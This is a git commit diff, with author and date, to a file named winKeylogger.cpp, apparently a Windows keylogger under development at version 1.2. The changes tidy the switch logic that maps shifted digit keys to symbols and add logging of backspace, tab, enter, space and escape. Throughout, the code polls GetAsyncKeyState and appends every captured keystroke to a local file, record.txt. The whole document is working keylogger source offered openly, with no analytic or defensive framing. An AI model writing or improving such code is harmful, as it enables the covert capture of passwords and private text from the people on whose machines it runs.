2a4ae1f111fa395e5548094bb3be0f404b03f93f
Surya Karmakar <surjokarmakarssj7@gmail.com>
2020-12-24 19:43:32 +0530

    Adding some virtual keycode => version 1.2

--- winKeylogger.cpp
+++ winKeylogger.cpp
@@ -11,14 +11,14 @@ void keylog(){
 			if (GetAsyncKeyState(key) == -32767){
 				ofstream write ("record.txt", ios::app);
 
-				//...[+]Upper case.............................................................
+				//...[+]Upper case....................................................................................................................
 				//shift(0x10), cap lock(0x14)
 				if(((key>64) && (key<91)) && (GetAsyncKeyState(0x10))){
 					write << key;
 					write.close();
 					break;
 				}
-				//...[+]Lower Case.............................................................
+				//...[+]Lower Case....................................................................................................................
 				else if (((key>64) && (key<91)) && !(GetAsyncKeyState(0x10))){
 					key +=32;
 					write << key;           
@@ -26,60 +26,75 @@ void keylog(){
 					break;
 				}
 
-				//...[+]Special Symbols.........................................................
+				//...[+]Special Symbols...............................................................................................................
+				
 				else{
 					switch (key){
-						case 48:{
+						case 48:
 							/*
-							if(GetAsyncKeyState(0x10)){
+							if(GetAsyncKeyState(0x10))
 								write << ")";
-								break;
-							}
-								
-							else{
+							else
 								write << key;
-								break;
-							}
+							break;
 							*/
 							(GetAsyncKeyState(0x10)?write << ")":write << key);
-								break;	
-						}
-						case 49:{
-								(GetAsyncKeyState(0x10)?write << "!":write << key);
-								break;
-							}
-						case 50:{
-								(GetAsyncKeyState(0x10)?write << "@":write << key);
-								break;
-						}
-						case 51:{
-								(GetAsyncKeyState(0x10)?write << "#":write << key);
-								break;
-						}
-						case 52:{
-								(GetAsyncKeyState(0x10)?write << "$":write << key);
-								break;
-						}
-						case 53:{
-								(GetAsyncKeyState(0x10)?write << "%":write << key);
-								break;
-						}
-						case 54:{
-								(GetAsyncKeyState(0x10)?write << "^":write << key);
-								break;
-						}
-						case 55:{
-								(GetAsyncKeyState(0x10)?write << "&":write << key);
-								break;
-						}
-						case 56:{
-								(GetAsyncKeyState(0x10)?write << "*":write << key);
-								break;
-						}
-						case 57:{
-								(GetAsyncKeyState(0x10)?write << "(":write << key);
-								break;
-						}
+							break;
+						
+						case 49:
+							(GetAsyncKeyState(0x10)?write << "!":write << key);
+							break;
+
+						case 50:
+							(GetAsyncKeyState(0x10)?write << "@":write << key);
+							break;
+
+						case 51:
+							(GetAsyncKeyState(0x10)?write << "#":write << key);
+							break;
+
+						case 52:
+							(GetAsyncKeyState(0x10)?write << "$":write << key);
+							break;
+
+						case 53:
+							(GetAsyncKeyState(0x10)?write << "%":write << key);
+							break;
+
+						case 54:
+							(GetAsyncKeyState(0x10)?write << "^":write << key);
+							break;
+
+						case 55:
+							(GetAsyncKeyState(0x10)?write << "&":write << key);
+							break;
+
+						case 56:
+							(GetAsyncKeyState(0x10)?write << "*":write << key);
+							break;
+
+						case 57:
+							(GetAsyncKeyState(0x10)?write << "(":write << key);
+							break;
+
+						//...[+]Special Symbols Virtual Key..........................................................................................
+						case VK_BACK:
+							write << "<BS>";  //backspace (0x08)
+							break;
+							
+						case VK_TAB:
+							write << "<Tab>"; //tab (0x09)
+							break;
+							
+						case VK_RETURN: 
+							write << "<Enter>\n";  //enter (0x0D)
+							break;
+							
+						case VK_SPACE:
+							write << "<Space>"; //space (0x20)
+							break;
+						case VK_ESCAPE:
+							write << "<Esc>"; //Esc (0x1B) 
 					}
 				}					
 			}
